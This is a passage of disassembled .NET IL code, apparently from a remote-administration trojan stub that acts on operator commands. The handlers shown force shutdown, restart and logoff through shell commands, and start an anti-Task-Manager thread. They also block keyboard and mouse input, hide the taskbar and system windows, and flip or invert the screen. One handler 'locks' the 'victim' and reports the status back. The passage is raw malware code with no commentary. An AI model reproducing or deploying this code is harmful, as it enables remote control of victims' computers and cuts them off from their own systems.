      IL_15d5:  ldstr      "btnHAs"
      IL_15da:  ldc.i4.0
      IL_15db:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15e0:  brfalse    IL_256d

      IL_15e5:  br         IL_266b

      IL_15ea:  ldloc.s    V_24
      IL_15ec:  ldstr      "btnHB"
      IL_15f1:  ldc.i4.0
      IL_15f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_15f7:  brfalse    IL_2581

      IL_15fc:  br         IL_266b

      IL_1601:  ldloc.s    V_24
      IL_1603:  ldstr      "btnLB"
      IL_1608:  ldc.i4.0
      IL_1609:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_160e:  brfalse    IL_2595

      IL_1613:  br         IL_266b

      IL_1618:  ldloc.s    V_24
      IL_161a:  ldstr      "btnLAs"
      IL_161f:  ldc.i4.0
      IL_1620:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1625:  brfalse    IL_25a9

      IL_162a:  br         IL_266b

      IL_162f:  ldloc.s    V_24
      IL_1631:  ldstr      "btnLA"
      IL_1636:  ldc.i4.0
      IL_1637:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_163c:  brfalse    IL_25bd

      IL_1641:  br         IL_266b

      IL_1646:  ldloc.s    V_24
      IL_1648:  ldstr      "btnLGs"
      IL_164d:  ldc.i4.0
      IL_164e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1653:  brfalse    IL_25d1

      IL_1658:  br         IL_266b

      IL_165d:  ldloc.s    V_24
      IL_165f:  ldstr      "btnLG"
      IL_1664:  ldc.i4.0
      IL_1665:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_166a:  brfalse    IL_25e5

      IL_166f:  br         IL_266b

      IL_1674:  ldloc.s    V_24
      IL_1676:  ldstr      "btnLFs"
      IL_167b:  ldc.i4.0
      IL_167c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1681:  brfalse    IL_25f6

      IL_1686:  br         IL_266b

      IL_168b:  ldloc.s    V_24
      IL_168d:  ldstr      "btnLF"
      IL_1692:  ldc.i4.0
      IL_1693:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1698:  brfalse    IL_2607

      IL_169d:  br         IL_266b

      IL_16a2:  ldloc.s    V_24
      IL_16a4:  ldstr      "btnLE"
      IL_16a9:  ldc.i4.0
      IL_16aa:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16af:  brfalse    IL_2618

      IL_16b4:  br         IL_266b

      IL_16b9:  ldloc.s    V_24
      IL_16bb:  ldstr      "btnLDs"
      IL_16c0:  ldc.i4.0
      IL_16c1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16c6:  brfalse    IL_2629

      IL_16cb:  br         IL_266b

      IL_16d0:  ldloc.s    V_24
      IL_16d2:  ldstr      "btnLD"
      IL_16d7:  ldc.i4.0
      IL_16d8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16dd:  brfalse    IL_263a

      IL_16e2:  br         IL_266b

      IL_16e7:  ldloc.s    V_24
      IL_16e9:  ldstr      "btnLCs"
      IL_16ee:  ldc.i4.0
      IL_16ef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_16f4:  brfalse    IL_264b

      IL_16f9:  br         IL_266b

      IL_16fe:  ldloc.s    V_24
      IL_1700:  ldstr      "btnLC"
      IL_1705:  ldc.i4.0
      IL_1706:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_170b:  brfalse    IL_265c

      IL_1710:  br         IL_266b

      IL_1715:  call       void j.OK::UNS()
      IL_171a:  br         IL_266b

      IL_171f:  ldc.i4.0
      IL_1720:  call       void j.OK::pr(int32)
      IL_1725:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_172a:  br         IL_266b

      IL_172f:  ldc.i4.0
      IL_1730:  call       void j.OK::pr(int32)
      IL_1735:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_173a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_173f:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_1744:  pop
      IL_1745:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_174a:  br         IL_266b

      IL_174f:  ldstr      "cmd /c start shutdown /s /f /t 0"
      IL_1754:  ldc.i4.0
      IL_1755:  ldc.i4.1
      IL_1756:  ldc.i4     0x1388
      IL_175b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1760:  pop
      IL_1761:  br         IL_266b

      IL_1766:  ldstr      "cmd /c start shutdown /r /f /t 0"
      IL_176b:  ldc.i4.0
      IL_176c:  ldc.i4.1
      IL_176d:  ldc.i4     0x1388
      IL_1772:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_1777:  pop
      IL_1778:  br         IL_266b

      IL_177d:  ldstr      "cmd /c start shutdown /l /f"
      IL_1782:  ldc.i4.0
      IL_1783:  ldc.i4.1
      IL_1784:  ldc.i4     0x1388
      IL_1789:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Shell(string,
                                                                                                 valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.AppWinStyle,
                                                                                                 bool,
                                                                                                 int32)
      IL_178e:  pop
      IL_178f:  br         IL_266b

      IL_1794:  newobj     instance void AntiTaskManager::.ctor()
      IL_1799:  stloc.s    V_35
      IL_179b:  ldloc.s    V_35
      IL_179d:  ldftn      instance void AntiTaskManager::protect()
      IL_17a3:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_17a8:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_17ad:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_17b2:  br         IL_266b

      IL_17b7:  call       void Stub.xma::Start()
      IL_17bc:  br         IL_266b

      IL_17c1:  ldc.i4.1
      IL_17c2:  call       bool j.OK::BlockInput(bool)
      IL_17c7:  pop
      IL_17c8:  br         IL_266b

      IL_17cd:  ldstr      "Shell_TrayWnd"
      IL_17d2:  ldnull
      IL_17d3:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_17d8:  ldc.i4.0
      IL_17d9:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_17de:  pop
      IL_17df:  br         IL_266b

      IL_17e4:  ldstr      "Shell_TrayWnd"
      IL_17e9:  ldnull
      IL_17ea:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_17ef:  ldc.i4.4
      IL_17f0:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_17f5:  pop
      IL_17f6:  br         IL_266b

      IL_17fb:  ldstr      "Progman"
      IL_1800:  ldnull
      IL_1801:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1806:  ldc.i4.0
      IL_1807:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_180c:  pop
      IL_180d:  br         IL_266b

      IL_1812:  ldstr      "Progman"
      IL_1817:  ldnull
      IL_1818:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_181d:  ldc.i4.4
      IL_181e:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1823:  pop
      IL_1824:  br         IL_266b

      IL_1829:  ldstr      "Progman"
      IL_182e:  ldnull
      IL_182f:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1834:  ldc.i4.4
      IL_1835:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_183a:  pop
      IL_183b:  br         IL_266b

      IL_1840:  ldstr      "Progman"
      IL_1845:  ldnull
      IL_1846:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_184b:  ldc.i4.4
      IL_184c:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1851:  pop
      IL_1852:  br         IL_266b

      IL_1857:  ldstr      "set CDAudio door open"
      IL_185c:  ldnull
      IL_185d:  ldc.i4.0
      IL_185e:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_1863:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_1868:  pop
      IL_1869:  br         IL_266b

      IL_186e:  ldstr      "set CDAudio door closed"
      IL_1873:  ldnull
      IL_1874:  ldc.i4.0
      IL_1875:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_187a:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_187f:  pop
      IL_1880:  br         IL_266b

      IL_1885:  call       void j.OK::ToggleDesktopIcons()
      IL_188a:  br         IL_266b

      IL_188f:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1894:  ldstr      "select.dat"
      IL_1899:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_189e:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_18a3:  brfalse.s  IL_18c4

      IL_18a5:  ldstr      "MSG"
      IL_18aa:  ldsfld     string j.OK::Y
      IL_18af:  ldstr      "victim already in locked mode"
      IL_18b4:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_18b9:  call       bool j.OK::Send(string)
      IL_18be:  pop
      IL_18bf:  br         IL_266b

      IL_18c4:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_18c9:  ldstr      "select.dat"
      IL_18ce:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_18d3:  call       class [mscorlib]System.IO.FileStream [mscorlib]System.IO.File::Create(string)
      IL_18d8:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
      IL_18dd:  ldstr      "MSG"
      IL_18e2:  ldsfld     string j.OK::Y
      IL_18e7:  ldstr      "victim now locked"
      IL_18ec:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_18f1:  call       bool j.OK::Send(string)
      IL_18f6:  pop
      IL_18f7:  br         IL_266b

      IL_18fc:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1901:  ldstr      "select.dat"
      IL_1906:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_190b:  call       bool [mscorlib]System.IO.File::Exists(string)
      IL_1910:  brfalse.s  IL_1945

      IL_1912:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_1917:  ldstr      "select.dat"
      IL_191c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_1921:  call       void [mscorlib]System.IO.File::Delete(string)
      IL_1926:  ldstr      "MSG"
      IL_192b:  ldsfld     string j.OK::Y
      IL_1930:  ldstr      "unlocke victim"
      IL_1935:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_193a:  call       bool j.OK::Send(string)
      IL_193f:  pop
      IL_1940:  br         IL_266b

      IL_1945:  ldstr      "MSG"
      IL_194a:  ldsfld     string j.OK::Y
      IL_194f:  ldstr      "victim was not locked, you need lock first"
      IL_1954:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_1959:  call       bool j.OK::Send(string)
      IL_195e:  pop
      IL_195f:  br         IL_266b

      IL_1964:  call       native int j.OK::GetDesktopWindow()
      IL_1969:  call       native int j.OK::GetWindowDC(native int)
      IL_196e:  stloc.s    V_36
      IL_1970:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1975:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_197a:  stloc.s    V_33
      IL_197c:  ldloca.s   V_33
      IL_197e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1983:  stloc.s    V_37
      IL_1985:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_198a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_198f:  stloc.s    V_33
      IL_1991:  ldloca.s   V_33
      IL_1993:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1998:  stloc.s    V_38
      IL_199a:  ldloc.s    V_36
      IL_199c:  ldloc.s    V_37
      IL_199e:  ldc.i4.0
      IL_199f:  ldc.i4.0
      IL_19a0:  ldloc.s    V_37
      IL_19a2:  sub.ovf
      IL_19a3:  ldloc.s    V_38
      IL_19a5:  ldloc.s    V_36
      IL_19a7:  ldc.i4.0
      IL_19a8:  ldc.i4.0
      IL_19a9:  ldloc.s    V_37
      IL_19ab:  ldloc.s    V_38
      IL_19ad:  ldc.i4     0xcc0020
      IL_19b2:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_19b7:  pop
      IL_19b8:  ldloc.s    V_36
      IL_19ba:  ldc.i4.0
      IL_19bb:  ldloc.s    V_38
      IL_19bd:  ldloc.s    V_37
      IL_19bf:  ldc.i4.0
      IL_19c0:  ldloc.s    V_38
      IL_19c2:  sub.ovf
      IL_19c3:  ldloc.s    V_36
      IL_19c5:  ldc.i4.0
      IL_19c6:  ldc.i4.0
      IL_19c7:  ldloc.s    V_37
      IL_19c9:  ldloc.s    V_38
      IL_19cb:  ldc.i4     0xcc0020
      IL_19d0:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_19d5:  pop
      IL_19d6:  br         IL_266b

      IL_19db:  call       native int j.OK::GetDesktopWindow()
      IL_19e0:  call       native int j.OK::GetWindowDC(native int)
      IL_19e5:  stloc.s    V_39
      IL_19e7:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_19ec:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_19f1:  stloc.s    V_33
      IL_19f3:  ldloca.s   V_33
      IL_19f5:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_19fa:  stloc.s    V_40
      IL_19fc:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1a01:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1a06:  stloc.s    V_33
      IL_1a08:  ldloca.s   V_33
      IL_1a0a:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1a0f:  stloc.s    V_41
      IL_1a11:  ldloc.s    V_39
      IL_1a13:  ldloc.s    V_40
      IL_1a15:  ldc.i4.0
      IL_1a16:  ldc.i4.0
      IL_1a17:  ldloc.s    V_40
      IL_1a19:  sub.ovf
      IL_1a1a:  ldloc.s    V_41
      IL_1a1c:  ldloc.s    V_39
      IL_1a1e:  ldc.i4.0
      IL_1a1f:  ldc.i4.0
      IL_1a20:  ldloc.s    V_40
      IL_1a22:  ldloc.s    V_41
      IL_1a24:  ldc.i4     0xcc0020
      IL_1a29:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_1a2e:  pop
      IL_1a2f:  br         IL_266b

      IL_1a34:  call       native int j.OK::GetDesktopWindow()
      IL_1a39:  call       native int j.OK::GetWindowDC(native int)
      IL_1a3e:  stloc.s    V_42
      IL_1a40:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1a45:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1a4a:  stloc.s    V_33
      IL_1a4c:  ldloca.s   V_33
      IL_1a4e:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1a53:  stloc.s    V_43
      IL_1a55:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1a5a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1a5f:  stloc.s    V_33
      IL_1a61:  ldloca.s   V_33
      IL_1a63:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1a68:  stloc.s    V_44
      IL_1a6a:  ldloc.s    V_42
      IL_1a6c:  ldc.i4.0
      IL_1a6d:  ldc.i4.0
      IL_1a6e:  ldloc.s    V_43
      IL_1a70:  ldloc.s    V_44
      IL_1a72:  ldloc.s    V_42
      IL_1a74:  ldc.i4.0
      IL_1a75:  ldc.i4.0
      IL_1a76:  ldloc.s    V_43
      IL_1a78:  ldloc.s    V_44
      IL_1a7a:  ldc.i4     0x330008
      IL_1a7f:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_1a84:  pop
      IL_1a85:  br         IL_266b

      IL_1a8a:  call       native int j.OK::GetDesktopWindow()
      IL_1a8f:  call       native int j.OK::GetWindowDC(native int)
      IL_1a94:  stloc.s    V_45
      IL_1a96:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1a9b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1aa0:  stloc.s    V_33
      IL_1aa2:  ldloca.s   V_33
      IL_1aa4:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1aa9:  stloc.s    V_46
      IL_1aab:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1ab0:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1ab5:  stloc.s    V_33
      IL_1ab7:  ldloca.s   V_33
      IL_1ab9:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1abe:  stloc.s    V_47
      IL_1ac0:  ldloc.s    V_45
      IL_1ac2:  ldc.i4.0
      IL_1ac3:  ldc.i4.0
      IL_1ac4:  ldloc.s    V_46
      IL_1ac6:  ldloc.s    V_47
      IL_1ac8:  ldloc.s    V_45
      IL_1aca:  ldc.i4.0
      IL_1acb:  ldc.i4.0
      IL_1acc:  ldloc.s    V_46
      IL_1ace:  ldloc.s    V_47
      IL_1ad0:  ldc.i4     0xff0062
      IL_1ad5:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_1ada:  pop
      IL_1adb:  br         IL_266b

      IL_1ae0:  call       native int j.OK::GetDesktopWindow()
      IL_1ae5:  call       native int j.OK::GetWindowDC(native int)
      IL_1aea:  stloc.s    V_48
      IL_1aec:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1af1:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1af6:  stloc.s    V_33
      IL_1af8:  ldloca.s   V_33
      IL_1afa:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_1aff:  stloc.s    V_49
      IL_1b01:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_1b06:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_1b0b:  stloc.s    V_33
      IL_1b0d:  ldloca.s   V_33
      IL_1b0f:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_1b14:  stloc.s    V_50
      IL_1b16:  ldloc.s    V_48
      IL_1b18:  ldc.i4.0
      IL_1b19:  ldc.i4.0
      IL_1b1a:  ldloc.s    V_49
      IL_1b1c:  ldloc.s    V_50
      IL_1b1e:  ldloc.s    V_48
      IL_1b20:  ldc.i4.0
      IL_1b21:  ldc.i4.0
      IL_1b22:  ldloc.s    V_49
      IL_1b24:  ldloc.s    V_50
      IL_1b26:  ldc.i4.s   66
      IL_1b28:  call       bool j.OK::StretchBlt(native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 native int,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 int32,
                                                 valuetype j.OK/TernaryRasterOperations)
      IL_1b2d:  pop
      IL_1b2e:  br         IL_266b

      IL_1b33:  ldstr      "Settings"
      IL_1b38:  ldnull
      IL_1b39:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1b3e:  ldc.i4.0
      IL_1b3f:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1b44:  pop
      IL_1b45:  ldstr      "Window"
      IL_1b4a:  ldnull
      IL_1b4b:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1b50:  ldc.i4.0
      IL_1b51:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1b56:  pop
      IL_1b57:  ldstr      "Task Host Window"
      IL_1b5c:  ldnull
      IL_1b5d:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1b62:  ldc.i4.0
      IL_1b63:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1b68:  pop
      IL_1b69:  ldstr      "DWM Notification Window"
      IL_1b6e:  ldnull
      IL_1b6f:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1b74:  ldc.i4.0
      IL_1b75:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1b7a:  pop
      IL_1b7b:  ldstr      "BluetoothNotificationAreaIconWindowClass"
      IL_1b80:  ldnull
      IL_1b81:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1b86:  ldc.i4.0
      IL_1b87:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1b8c:  pop
      IL_1b8d:  ldstr      "CiceroUIWndFrame"
      IL_1b92:  ldnull
      IL_1b93:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1b98:  ldc.i4.0
      IL_1b99:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1b9e:  pop
      IL_1b9f:  ldstr      "Temp Window"
      IL_1ba4:  ldnull
      IL_1ba5:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1baa:  ldc.i4.0
      IL_1bab:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1bb0:  pop
      IL_1bb1:  ldstr      "Default IME"
      IL_1bb6:  ldnull
      IL_1bb7:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1bbc:  ldc.i4.0
      IL_1bbd:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1bc2:  pop
      IL_1bc3:  ldstr      "MSCTFIME UI"
      IL_1bc8:  ldnull
      IL_1bc9:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1bce:  ldc.i4.0
      IL_1bcf:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1bd4:  pop
      IL_1bd5:  ldstr      "DDE Server Window"
      IL_1bda:  ldnull
      IL_1bdb:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1be0:  ldc.i4.0
      IL_1be1:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1be6:  pop
      IL_1be7:  ldstr      "MediaContextNotificationWIndow"
      IL_1bec:  ldnull
      IL_1bed:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1bf2:  ldc.i4.0
      IL_1bf3:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1bf8:  pop
      IL_1bf9:  ldstr      "MS_WebcheckMonitor"
      IL_1bfe:  ldnull
      IL_1bff:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c04:  ldc.i4.0
      IL_1c05:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c0a:  pop
      IL_1c0b:  ldstr      "Windows Push Notifications Platform"
      IL_1c10:  ldnull
      IL_1c11:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c16:  ldc.i4.0
      IL_1c17:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c1c:  pop
      IL_1c1d:  br         IL_266b

      IL_1c22:  ldstr      "Settings"
      IL_1c27:  ldnull
      IL_1c28:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c2d:  ldc.i4.4
      IL_1c2e:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c33:  pop
      IL_1c34:  ldstr      "Window"
      IL_1c39:  ldnull
      IL_1c3a:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c3f:  ldc.i4.4
      IL_1c40:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c45:  pop
      IL_1c46:  ldstr      "Task Host Window"
      IL_1c4b:  ldnull
      IL_1c4c:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c51:  ldc.i4.4
      IL_1c52:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c57:  pop
      IL_1c58:  ldstr      "DWM Notification Window"
      IL_1c5d:  ldnull
      IL_1c5e:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c63:  ldc.i4.4
      IL_1c64:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c69:  pop
      IL_1c6a:  ldstr      "BluetoothNotificationAreaIconWindowClass"
      IL_1c6f:  ldnull
      IL_1c70:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c75:  ldc.i4.4
      IL_1c76:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c7b:  pop
      IL_1c7c:  ldstr      "CiceroUIWndFrame"
      IL_1c81:  ldnull
      IL_1c82:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c87:  ldc.i4.4
      IL_1c88:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c8d:  pop
      IL_1c8e:  ldstr      "Temp Window"
      IL_1c93:  ldnull
      IL_1c94:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1c99:  ldc.i4.4
      IL_1c9a:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1c9f:  pop
      IL_1ca0:  ldstr      "Default IME"
      IL_1ca5:  ldnull
      IL_1ca6:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1cab:  ldc.i4.4
      IL_1cac:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1cb1:  pop
      IL_1cb2:  ldstr      "MSCTFIME UI"
      IL_1cb7:  ldnull
      IL_1cb8:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1cbd:  ldc.i4.4
      IL_1cbe:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1cc3:  pop
      IL_1cc4:  ldstr      "DDE Server Window"
      IL_1cc9:  ldnull
      IL_1cca:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_1ccf:  ldc.i4.4
      IL_1cd0:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_1cd5:  pop
      IL_1cd6:  ldstr      "MediaContextNotificationWIndow"
